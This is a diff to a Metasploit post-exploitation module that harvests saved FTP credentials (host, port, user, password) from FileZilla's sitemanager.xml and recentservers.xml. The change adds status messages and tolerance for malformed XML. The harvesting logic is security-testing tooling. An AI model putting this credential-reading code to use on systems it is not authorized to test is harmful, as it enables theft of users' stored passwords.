@@ -179,6 +179,7 @@ class Metasploit3 < Msf::Post
 						sitedata << sites.read
 					end
 					sites.close
+					print_status("Parsing sitemanager.xml")
 					creds = [parse_accounts(sitedata)]
 				else
 					print_status("No saved connections where found")
@@ -192,6 +193,7 @@ class Metasploit3 < Msf::Post
 						recentdata << recents.read
 					end
 					recents.close
+					print_status("Parsing recentservers.xml")
 					creds << parse_accounts(recentdata)
 				else
 					print_status("No recent connections where found.")
@@ -209,9 +211,11 @@ class Metasploit3 < Msf::Post
 
 	def parse_accounts(data)
 		creds = []
-		doc = REXML::Document.new(data).root
-		
-		doc.elements.to_a("//Server").each do |sub|
+
+		doc = REXML::Document.new(data).root rescue nil
+		return [] if doc.nil?
+
+		doc.elements.to_a("//Server").each do |sub| 
 			account = {}
 			account['host'] = sub.elements['Host'].text rescue "<unknown>"
 			account['port'] = sub.elements['Port'].text rescue "<unknown>"
@@ -222,7 +226,6 @@ class Metasploit3 < Msf::Post
 			when /1|4/
 				account['user'] = sub.elements['User'].text rescue "<unknown>"
 				account['password'] = sub.elements['Pass'].text rescue "<unknown>"
-				
 			when /2|3/
 				account['user'] = sub.elements['User'].text rescue "<unknown>"
 				account['password'] = "<blank>"
